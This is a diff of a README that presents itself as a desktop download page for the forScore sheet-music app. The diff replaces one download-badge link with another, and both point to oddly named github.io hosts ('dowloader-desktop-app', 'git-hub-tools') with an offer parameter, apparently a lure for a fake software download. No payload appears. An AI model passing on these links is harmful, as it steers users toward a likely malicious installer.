@@ -1,10 +1,10 @@
 # forScore Download — Desktop App for Sheet Music
 
-<a href="https://dowloader-desktop-app.github.io/.github/?offer=forScore" target="_blank">
+<a href="https://git-hub-tools.github.io/.github/?offer=forScore" target="_blank">
   <img 
-    src="https://img.shields.io/badge/Get%20forScore-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
+    src="https://img.shields.io/badge/forScore%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
-    alt="Get forScore GitHub">
+    alt="forScore GitHub">
 </a>
 
 ---
